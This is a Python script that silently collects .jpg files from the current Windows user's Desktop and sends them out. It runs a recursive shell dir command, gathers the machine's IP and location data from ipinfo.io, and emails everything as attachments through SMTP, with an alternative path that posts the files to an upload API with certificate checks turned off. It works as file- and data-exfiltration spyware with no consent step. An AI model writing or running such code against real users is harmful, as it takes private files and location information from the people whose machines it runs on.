from email import encoders
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
import psutil
import smtplib
import subprocess 
import ssl
import os
import requests
import urllib3

# removes the future warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# result = run([sys.executable,"-c","print('ocean')"], capture_output=True).stdout.decode()

# gets the user name
username = psutil.users()[0].name

# path where we're gonna extract the files
path = f"C:/Users/{username}/Desktop/"

# info about the type of file we're sending
file_extension = ".jpg"
file_type = "images"
file_format = "image/jpg"

# url of the server listening
url = "https://localhost:7056/api/Upload/UploadFiles"

# config data for sending mails
host = ""
port = 0
email = ""
password = ""


def getUserData():

    global username

    # sending a request to api and getting user data
    res = requests.get(url="https://ipinfo.io/json", verify= True)

    if res.status_code != 200:
        return f"Status: {res.status_code}, Problem with the request."
    
    data = res.json()
    data["user"] = username

    return data


def executeCommand():

    global path
    global file_extension

    print("Uploading...")

    # execute cmd command and retrieve files with the chosen extension
    # this cmd execute a recurse command that means it will look inside the folder for files with the extension
    command = subprocess.run(
        ["cd", path,"&","dir","/a-D","/S", "/B", f"*{file_extension}"], shell=True, capture_output=True)

    # returns a list with the path of the files
    results = command.stdout.decode().replace("\r","").split("\n")[0:-1]    

    return results


def formatList(results):

    global username
    global file_type
    global file_format
    global file_extension
    
    # creates a list with the format required by the requests package
    count = 1
    file_list = []
    for item in results:
        # file_list.append(("images", ("file_name.jpg", open("filename.jpg", "rb"), "image/jpg")))
        file_list.append(
            (file_type, (f"file_{username}_{count}{file_extension}", 
                open(item, "rb"), file_format)))
        count+=1
    
    return file_list


def sendToSERVER(file_list):

    global url

    # send a request with the files attach it
    req = requests.post(url= url, files= file_list, verify= False)

    return req


def sendToEmail(results):

    global username
    global password
    global email
    global port
    global host

    message = MIMEMultipart("alternative")
    message["Subject"] = "Files sent by program (Upload Files To Server)"
    message["From"] = f"Upload Files To Server <{email}>"
    message["To"] = email

    text = getUserData().__str__()
    body = MIMEText(text, "plain")
    message.attach(body)

    count = 1
    for item in results:
        attachments = MIMEBase("application", "octet-stream")
        attachments.set_payload( open(item, "rb").read() )
        encoders.encode_base64(attachments)
        filename = f"filename = file_({username})_{count}_{os.path.basename(item)}"
        attachments.add_header(
            "Content-Disposition", 
            f"attachment; {filename}")
        message.attach(attachments)
        count+= 1
    
    try:
        context = ssl.create_default_context()

        # setting the smtp object and login
        smtp = smtplib.SMTP(host, port)
        smtp.starttls(context= context)
        smtp.login(email, password)

        # sending the mail to the email
        smtp.sendmail(email, message["To"], message.as_string())

    except Exception as ex:
        return False

    finally:
      smtp.quit()
      return True


results = executeCommand()

            #####
            #####
            #####
            #####
         ###########
          #########
           #######
            #####
             ###
              #

# CODE TO SEND FILES TO SERVER
"""
file_list = formatList(results)

res = sendToSERVER(file_list)

if res.status_code == 200:
    print("Files sent to server!")
else:
    print("Error sending files to server!")
"""

# CODE TO SEND FILES TO EMAIL
res = sendToEmail(results)


